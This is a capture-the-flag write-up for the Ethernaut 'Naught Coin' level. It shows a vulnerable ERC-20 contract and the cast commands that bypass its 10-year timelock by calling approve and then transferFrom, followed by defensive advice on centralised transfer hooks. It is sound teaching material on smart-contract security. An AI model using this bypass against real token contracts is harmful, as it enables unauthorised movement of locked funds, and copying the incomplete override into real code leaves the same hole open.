# 15 - Naught Coin

## Overview

- **Difficulty:** 5/10
- **Network:** Sepolia Testnet
- **Instance Address:** [`0xba244f74a6eb927daa11771b233a82bac5707828`](https://sepolia.etherscan.io/address/0xba244f74a6eb927daa11771b233a82bac5707828)
- **Transactions:**
  - **1. Approve Spender (`approve()`):** [`0xdbcb83413d3dcbdc0b8d03a06b56322c45eb95b7edd48a3a79a622fa00958e49`](https://sepolia.etherscan.io/tx/0xdbcb83413d3dcbdc0b8d03a06b56322c45eb95b7edd48a3a79a622fa00958e49)
  - **2. Bypass Timelock (`transferFrom()`):** [`0xadda6a76e456be93e54e6488347ef5c789624c21d94a662e971bbf4055279457`](https://sepolia.etherscan.io/tx/0xadda6a76e456be93e54e6488347ef5c789624c21d94a662e971bbf4055279457)
  - **3. Level Submission:** [`0x23c9ac4eca5b30b7eb6e08003e8c34e90ff9b87d084cd7eaf66be5fd393286f0`](https://sepolia.etherscan.io/tx/0x23c9ac4eca5b30b7eb6e08003e8c34e90ff9b87d084cd7eaf66be5fd393286f0)

---

## Objective

Transfer all Naught Coins out of the player's account to reduce the player's balance to 0 before the 10-year timelock expires.

---

## Contract Analysis

The target contract is [`src/15-naught-coin/NaughtCoin.sol`](./NaughtCoin.sol):

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {ERC20} from "@openzeppelin/contracts/token/ERC20/ERC20.sol";

contract NaughtCoin is ERC20 {
    uint256 public timeLock = block.timestamp + 10 * 365 days;
    uint256 public INITIAL_SUPPLY;
    address public player;

    constructor(address _player) ERC20("NaughtCoin", "0x0") {
        player = _player;
        INITIAL_SUPPLY = 1000000 * (10 ** uint256(decimals()));
        _mint(player, INITIAL_SUPPLY);
        emit Transfer(address(0), player, INITIAL_SUPPLY);
    }

    function transfer(address _to, uint256 _value) public override lockTokens returns (bool) {
        super.transfer(_to, _value);
    }

    // Prevent the initial owner from transferring tokens until the timelock has passed
    modifier lockTokens() {
        if (msg.sender == player) {
            require(block.timestamp > timeLock);
            _;
        } else {
            _;
        }
    }
}
```

---

### Vulnerability Breakdown: Incomplete ERC-20 Interface Override

The contract attempts to enforce a 10-year timelock on the player's tokens by overriding the standard `transfer` function with the `lockTokens` modifier:

```solidity
function transfer(address _to, uint256 _value) public override lockTokens returns (bool) {
    super.transfer(_to, _value);
}
```

However, under the **ERC-20 token standard**, there are **two** distinct ways to transfer tokens:

1. **Direct Transfer:** `transfer(address to, uint256 amount)`
2. **Delegated Transfer:** `approve(address spender, uint256 amount)` + `transferFrom(address from, address to, uint256 amount)`

#### The Flaw

In OpenZeppelin's standard ERC-20 implementation:
- `transferFrom(from, to, amount)` invokes the internal `_transfer(from, to, amount)` function directly.
- **It never calls the public `transfer(...)` function!**

Because the contract author only overrode `transfer()` and left `transferFrom()` untouched, the `lockTokens` modifier is **never executed** when tokens are moved using `transferFrom()`.

```text
Standard Path (Blocked by Timelock):
[ Player ] ─── transfer() ───▶ [ lockTokens Check ] ───▶ REVERT! (block.timestamp <= timeLock)

Exploit Path (Bypasses Timelock):
[ Player ] ─── 1. approve(player, balance) ───▶ [ Sets Allowance ]
[ Player ] ─── 2. transferFrom(player, recipient, balance) ───▶ [ _transfer() ] ───▶ SUCCESS! 🚀
```

---

## Step-by-Step Exploit Walkthrough

No exploit contract is needed; the entire attack is performed directly using Foundry's `cast`.

### 1. Check Player Balance

Query the player's initial balance:

```bash
cast call 0xba244f74a6eb927daa11771b233a82bac5707828 \
  "balanceOf(address)(uint256)" 0xf511E1029dE5295f6D0dE05f4431DdA203e63607 \
  --rpc-url sepolia
# Output: 1000000000000000000000000 (1,000,000 * 10^18)
```

### 2. Approve Self as Spender

Approve your own address to spend the entire balance:

```bash
cast send 0xba244f74a6eb927daa11771b233a82bac5707828 \
  "approve(address,uint256)" 0xf511E1029dE5295f6D0dE05f4431DdA203e63607 1000000000000000000000000 \
  --rpc-url sepolia \
  --account <ACCOUNT_NAME>
```

- **Approve Tx:** [`0xdbcb83413d3dcbdc0b8d03a06b56322c45eb95b7edd48a3a79a622fa00958e49`](https://sepolia.etherscan.io/tx/0xdbcb83413d3dcbdc0b8d03a06b56322c45eb95b7edd48a3a79a622fa00958e49)

### 3. Transfer Out via `transferFrom`

Call `transferFrom`, transferring the entire token balance from the player to an arbitrary address:

```bash
cast send 0xba244f74a6eb927daa11771b233a82bac5707828 \
  "transferFrom(address,address,uint256)" \
  0xf511E1029dE5295f6D0dE05f4431DdA203e63607 \
  0x000000000000000000000000000000000000dEaD \
  1000000000000000000000000 \
  --rpc-url sepolia \
  --account <ACCOUNT_NAME>
```

- **TransferFrom Tx:** [`0xadda6a76e456be93e54e6488347ef5c789624c21d94a662e971bbf4055279457`](https://sepolia.etherscan.io/tx/0xadda6a76e456be93e54e6488347ef5c789624c21d94a662e971bbf4055279457)

### 4. Verify Balance is Zero

```bash
cast call 0xba244f74a6eb927daa11771b233a82bac5707828 \
  "balanceOf(address)(uint256)" 0xf511E1029dE5295f6D0dE05f4431DdA203e63607 \
  --rpc-url sepolia
# Output: 0
```

### 5. Submit Level

Submit the instance on the Ethernaut dashboard:

- **Submission Tx:** [`0x23c9ac4eca5b30b7eb6e08003e8c34e90ff9b87d084cd7eaf66be5fd393286f0`](https://sepolia.etherscan.io/tx/0x23c9ac4eca5b30b7eb6e08003e8c34e90ff9b87d084cd7eaf66be5fd393286f0)

---

## Key Security Takeaways

1. **Override All Interface Transfer Paths:**
   When adding custom restrictions to standard token behaviors (ERC-20, ERC-721, ERC-1155), ensure **every** function capable of initiating transfers is protected (`transfer`, `transferFrom`, and permit-based transfers).
2. **Hook-Based Restrictions:**
   Instead of overriding individual external transfer functions, use OpenZeppelin's centralized internal hooks:
   - In OpenZeppelin v4: override `_beforeTokenTransfer(address from, address to, uint256 amount)`.
   - In OpenZeppelin v5: override `_update(address from, address to, uint256 value)`.
   Because all public transfer methods route through these internal functions, a restriction placed inside the internal hook cannot be bypassed.
